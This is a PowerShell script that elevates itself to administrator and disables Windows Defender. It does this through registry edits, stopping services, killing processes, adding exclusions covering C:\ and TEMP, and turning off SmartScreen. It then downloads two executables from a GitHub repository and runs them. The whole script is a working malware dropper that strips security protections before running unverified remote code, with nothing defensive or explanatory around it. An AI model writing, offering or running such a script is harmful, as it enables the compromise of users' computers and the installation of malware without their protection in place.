Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevation failed"
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -executionpolicy bypass -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

Write-Host "=========================================" -ForegroundColor Yellow
Write-Host "=== DISABLING WINDOWS DEFENDER FIRST ===" -ForegroundColor Yellow
Write-Host "=========================================" -ForegroundColor Yellow

# 1. Disable Tamper Protection (required)
Write-Host "[1/6] Disabling Tamper Protection..." -ForegroundColor Cyan
try {
    reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f 2>&1 | Out-Null
    Write-Host "  Tamper Protection disabled" -ForegroundColor Green
} catch {
    Write-Host "  Failed (may already be disabled)" -ForegroundColor Yellow
}

# 2. Stop Defender services
Write-Host "[2/6] Stopping Defender services..." -ForegroundColor Cyan
$services = @("WinDefend", "WdNisSvc", "MDCoreSvc", "SecurityHealthService")
foreach ($svc in $services) {
    try {
        Stop-Service $svc -Force -ErrorAction SilentlyContinue
        Write-Host "  Stopped: $svc" -ForegroundColor Gray
    } catch {}
}

# 3. Disable via Registry (most effective)
Write-Host "[3/6] Disabling via Registry..." -ForegroundColor Cyan
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /f 2>&1 | Out-Null

reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
Write-Host "  Registry keys set" -ForegroundColor Green

# 4. Kill Defender processes
Write-Host "[4/6] Killing Defender processes..." -ForegroundColor Cyan
$processes = @("MsMpEng", "NisSrv", "SecurityHealthService", "MsSense")
foreach ($proc in $processes) {
    try {
        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
        Write-Host "  Killed: $proc" -ForegroundColor Gray
    } catch {}
}

# 5. Add exclusions for TEMP and Downloads
Write-Host "[5/6] Adding exclusions..." -ForegroundColor Cyan
try {
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
    Write-Host "  Exclusions added for TEMP and C:\" -ForegroundColor Green
} catch {}

# 6. Disable via PowerShell cmdlets
Write-Host "[6/6] Disabling via Set-MpPreference..." -ForegroundColor Cyan
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
    Write-Host "  Set-MpPreference applied" -ForegroundColor Green
} catch {
    Write-Host "  Some commands failed (may need reboot)" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "=========================================" -ForegroundColor Yellow
Write-Host "=== CHECKING DEFENDER STATUS ===" -ForegroundColor Yellow
Write-Host "=========================================" -ForegroundColor Yellow

# Check status
try {
    $status = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($status) {
        Write-Host "RealTimeProtectionEnabled: $($status.RealTimeProtectionEnabled)" -ForegroundColor $(if($status.RealTimeProtectionEnabled){"Red"}else{"Green"})
    }
} catch {}

$svc = Get-Service WinDefend -ErrorAction SilentlyContinue
if ($svc) {
    Write-Host "WinDefend Service: $($svc.Status)" -ForegroundColor $(if($svc.Status -eq "Running"){"Red"}else{"Green"})
}

Write-Host ""
Write-Host "=========================================" -ForegroundColor Yellow
Write-Host "=== DOWNLOADING FILES ===" -ForegroundColor Yellow
Write-Host "=========================================" -ForegroundColor Yellow

$temp = $env:TEMP
$downloaded = 0

function Download-File {
    param($url, $dest)
    
    if (Test-Path $dest) { 
        Remove-Item $dest -Force -ErrorAction SilentlyContinue 
    }
    
    try {
        Write-Host "Downloading from: $url" -ForegroundColor Gray
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $dest)
        $wc.Dispose()
        return $true
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-Host "[1/2] proga1.exe" -ForegroundColor Cyan
if (Download-File $url1 $dest1) {
    if ((Get-Item $dest1).Length -gt 0) {
        Write-Host "SUCCESS: proga1.exe" -ForegroundColor Green
        $downloaded++
    }
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "[2/2] proga2.exe" -ForegroundColor Cyan
if (Download-File $url2 $dest2) {
    if ((Get-Item $dest2).Length -gt 0) {
        Write-Host "SUCCESS: proga2.exe" -ForegroundColor Green
        $downloaded++
    }
} else {
    Write-Host "WARNING: proga2.exe not found, copying from proga1.exe" -ForegroundColor Yellow
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        $downloaded++
    }
}

Write-Host ""
Write-Host "=========================================" -ForegroundColor Yellow
Write-Host "=== RUNNING FILES ===" -ForegroundColor Yellow
Write-Host "=========================================" -ForegroundColor Yellow

# Disable SmartScreen for current session
Write-Host "Disabling SmartScreen..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue

function Run-File {
    param($path, $name)
    
    if (-not (Test-Path $path)) {
        Write-Host "$name not found!" -ForegroundColor Red
        return $false
    }
    
    Write-Host "Starting $name ..." -ForegroundColor Green
    
    # Try multiple methods
    try {
        Start-Process -FilePath $path -WindowStyle Normal -ErrorAction Stop
        Write-Host "  Started via Start-Process" -ForegroundColor Gray
        return $true
    } catch {
        Write-Host "  Start-Process failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
    }
    
    try {
        cmd /c start "" "$path" 2>&1 | Out-Null
        Write-Host "  Started via cmd" -ForegroundColor Gray
        return $true
    } catch {
        Write-Host "  cmd method failed" -ForegroundColor DarkYellow
    }
    
    try {
        Invoke-Item $path -ErrorAction Stop
        Write-Host "  Started via Invoke-Item" -ForegroundColor Gray
        return $true
    } catch {
        Write-Host "  Invoke-Item failed" -ForegroundColor DarkYellow
    }
    
    Write-Host "  FAILED to run $name" -ForegroundColor Red
    return $false
}

Run-File $dest1 "proga1.exe"
Start-Sleep -Seconds 1
Run-File $dest2 "proga2.exe"

Write-Host ""
Write-Host "=========================================" -ForegroundColor Green
Write-Host "=== DONE ($downloaded/2 files) ===" -ForegroundColor Green
Write-Host "=========================================" -ForegroundColor Green
Write-Host ""
Write-Host "IMPORTANT: If files still don't run, REBOOT your PC first"
Write-Host "          then run this script again."
Write-Host ""
Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
